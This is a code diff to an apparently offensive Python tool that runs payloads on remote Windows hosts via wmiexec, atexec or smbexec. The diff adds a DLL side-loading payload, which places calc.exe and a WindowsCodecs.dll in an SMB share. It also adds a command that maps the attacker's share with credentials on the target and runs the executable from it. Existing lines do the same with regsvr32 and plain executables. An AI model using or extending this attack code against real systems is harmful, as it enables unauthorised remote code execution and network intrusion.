@@ -770,6 +770,19 @@ def gen_payload_exe(share_name, payload_name, addresses_array):
             f.write(addr + "\n")
         f.close()
 
+def gen_payload_dllsideload(share_name, addresses_array):
+
+    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
+    os.system('chmod +rx /var/tmp/{}/calc.exe'.format(share_name))
+
+    os.system('sudo cp {}/src/WindowsCodecs /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
+    os.system('chmod +rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
+
+    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
+        for addr in addresses_array:
+            f.write(addr + "\n")
+        f.close()
+
 def gen_payload_regsvr32(share_name, payload_name, addresses_array):
     addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
 
@@ -1220,7 +1233,7 @@ if __name__ == '__main__':
     parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
     parser.add_argument('-timeout', action='store', type=int, default=90, help='Set the timeout in seconds for each thread default=90')
     parser.add_argument('-method', action='store', default='wmiexec', choices=['wmiexec', 'atexec', 'smbexec'], help='Choose a method to execute the commands')
-    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'exe'], help='Choose a payload type')
+    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
     parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
     parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                        '"%s"). If errors are detected, run chcp.com at the target, '
@@ -1366,6 +1379,8 @@ if __name__ == '__main__':
             addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
         elif options.payload == 'exe':
             gen_payload_exe(share_name, payload_name, addresses)
+        elif options.payload == 'dllsideload':
+            gen_payload_dllsideload(share_name, addresses)
 
 
         print("\n[This is where the fun begins]\n{} Executing payload via {}\n".format(green_plus, options.method))
@@ -1375,6 +1390,8 @@ if __name__ == '__main__':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
         elif options.payload == 'exe':
             command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
+        elif options.payload == 'dllsideload':
+            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
 
         print(command)
         print("")
